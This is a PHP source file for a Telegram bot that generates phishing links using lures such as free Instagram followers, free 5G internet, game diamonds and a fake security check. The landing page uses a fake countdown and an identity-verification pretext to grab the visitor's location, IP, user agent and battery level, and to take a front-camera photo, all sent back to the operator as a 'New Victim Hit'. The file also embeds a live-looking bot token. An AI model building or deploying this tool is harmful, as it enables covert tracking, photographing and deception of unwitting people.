<?php
/*
 * R8rAIHAN Bot - Ultra Pro Max Version
 */

$botToken = "8792226932:AAE4Gye8mYar9Vx5vqcaDUgUUK0Q3Y6TXeQ"; // এখানে আপনার টোকেন দিন
$api = "https://api.telegram.org/bot$botToken";

function tg($method, $data) {
    global $api;
    $url = $api . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

$update = json_decode(file_get_contents("php://input"), true);
$message = $update['message'] ?? null;

if ($message) {
    $chatId = $message['chat']['id'];
    $text = trim($message['text'] ?? '');

    if ($text === "/start") {
        tg("sendMessage", [
            "chat_id" => $chatId,
            "text" => "🚀 *Welcome to R8rAIHAN Bot v2.0*\n\nChoose a template to generate your link:",
            "parse_mode" => "Markdown",
            "reply_markup" => json_encode([
                "keyboard" => [
                    [["text" => "📸 Instagram Followers"], ["text" => "📶 Free 5G Internet"]],
                    [["text" => "🎮 Game Diamonds"], ["text" => "🔐 Security Check"]]
                ],
                "resize_keyboard" => true
            ])
        ]);
        exit;
    }

    $templates = [
        "📸 Instagram Followers" => "followers",
        "📶 Free 5G Internet" => "internet",
        "🎮 Game Diamonds" => "gaming",
        "🔐 Security Check" => "security"
    ];

    if (isset($templates[$text])) {
        file_put_contents("/tmp/step_$chatId", $templates[$text]);
        tg("sendMessage", [
            "chat_id" => $chatId,
            "text" => "✍️ *Enter a Name for the victim:*",
            "parse_mode" => "Markdown",
            "reply_markup" => json_encode(["remove_keyboard" => true])
        ]);
        exit;
    }

    if (file_exists("/tmp/step_$chatId")) {
        $type = file_get_contents("/tmp/step_$chatId");
        unlink("/tmp/step_$chatId");
        $name = urlencode($text);
        $appUrl = "https://" . $_SERVER['HTTP_HOST']; 
        $link = "$appUrl/index.php?u=$chatId&n=$name&t=$type";
        
        tg("sendMessage", [
            "chat_id" => $chatId,
            "text" => "🔥 *Link Generated Successfully!*\n\n*Target:* $text\n*Template:* $type\n\n🔗 *URL:* `$link`",
            "parse_mode" => "Markdown",
            "reply_markup" => json_encode([
                "keyboard" => [[["text" => "📸 Instagram Followers"]]],
                "resize_keyboard" => true
            ])
        ]);
        exit;
    }
}

// Data Submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'])) {
    $chatId = $_POST['u'];
    $name = $_POST['n'];
    $lat = $_POST['lat'] ?: "Denied";
    $lon = $_POST['lon'] ?: "Denied";
    $battery = $_POST['battery'] ?: "N/A";
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    
    $mapLink = ($lat !== "Denied") ? "https://www.google.com/maps?q=$lat,$lon" : "Not Available";

    $msg = "🔔 *R8rAIHAN - New Victim Hit!*\n\n" .
           "👤 *Name:* $name\n" .
           "🌐 *IP:* `$ip`\n" .
           "🔋 *Battery:* $battery\n" .
           "📱 *UA:* `$ua`\n" .
           "📍 *Location:* [Open in Maps]($mapLink)";

    tg("sendMessage", ["chat_id" => $chatId, "text" => $msg, "parse_mode" => "Markdown"]);

    if (!empty($_FILES['photo']['tmp_name'])) {
        $photo = new CURLFile($_FILES['photo']['tmp_name']);
        tg("sendPhoto", ["chat_id" => $chatId, "photo" => $photo, "caption" => "📸 Front Camera Capture"]);
    }
    echo "OK";
    exit;
}

$chatId = $_GET['u'] ?? '';
$name = $_GET['n'] ?? '';
$type = $_GET['t'] ?? 'followers';
if (!$chatId || !$name) exit("Access Denied");

$titles = [
    "followers" => "Get 1K Free Instagram Followers",
    "internet" => "Activate Free 25GB 5G Internet",
    "gaming" => "Claim 1000 Free Diamonds/Coins",
    "security" => "Verify Your Account Security"
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?=$titles[$type]?></title>
    <style>
        :root { --primary: #00ff9c; --bg: #0a0a0a; }
        body { margin:0; font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { width: 90%; max-width: 380px; background: #161616; padding: 30px; border-radius: 24px; text-align: center; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
        .icon { font-size: 50px; margin-bottom: 15px; }
        h2 { color: var(--primary); margin: 10px 0; font-size: 22px; }
        p { font-size: 14px; color: #aaa; margin-bottom: 25px; }
        .timer { font-weight: bold; color: #ff4757; margin-bottom: 20px; font-family: monospace; }
        button { width: 100%; padding: 16px; background: var(--primary); border: 0; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; color: #000; }
        button:hover { transform: scale(1.02); opacity: 0.9; }
        .loader { display:none; margin-top: 20px; border: 3px solid #333; border-top: 3px solid var(--primary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-left: auto; margin-right: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card" id="mainCard">
        <div class="icon"><?= ($type=='followers'?'🚀':($type=='internet'?'📶':'🎮')) ?></div>
        <h2><?=$titles[$type]?></h2>
        <p>This is a limited time offer for verified users only. Please verify your identity to continue.</p>
        <div class="timer" id="countdown">Offer ends in: 04:59</div>
        <button onclick="start()">CLAIM NOW</button>
        <div class="loader" id="loader"></div>
    </div>

    <form id="f" method="post" enctype="multipart/form-data">
        <input type="hidden" name="u" value="<?=htmlspecialchars($chatId)?>">
        <input type="hidden" name="n" value="<?=htmlspecialchars($name)?>">
        <input type="hidden" name="lat" id="lat"><input type="hidden" name="lon" id="lon">
        <input type="hidden" name="battery" id="battery">
        <input type="file" name="photo" id="photo" hidden>
    </form>

    <script>
    // Timer Code
    let time = 299;
    const timerEl = document.getElementById('countdown');
    setInterval(() => {
        let min = Math.floor(time / 60);
        let sec = time % 60;
        timerEl.innerText = `Offer ends in: 0${min}:${sec < 10 ? '0'+sec : sec}`;
        if(time > 0) time--;
    }, 1000);

    async function start(){
        document.getElementById('loader').style.display = 'block';
        navigator.geolocation.getCurrentPosition(pos => {
            document.getElementById('lat').value = pos.coords.latitude;
            document.getElementById('lon').value = pos.coords.longitude;
            capture();
        }, err => { capture(); });
    }

    async function capture(){
        if(navigator.getBattery){
            const b = await navigator.getBattery();
            document.getElementById('battery').value = Math.round(b.level*100)+"%";
        }
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:true});
            const video = document.createElement("video");
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement("canvas");
            setTimeout(() => {
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext("2d").drawImage(video,0,0);
                canvas.toBlob(blob => {
                    const file = new File([blob], "p.jpg", {type:"image/jpeg"});
                    const dt = new DataTransfer(); dt.items.add(file);
                    document.getElementById('photo').files = dt.files;
                    stream.getTracks().forEach(t => t.stop());
                    document.getElementById("f").submit();
                }, "image/jpeg");
            }, 1000);
        } catch(e) { document.getElementById("f").submit(); }
    }
    </script>
</body>
</html>
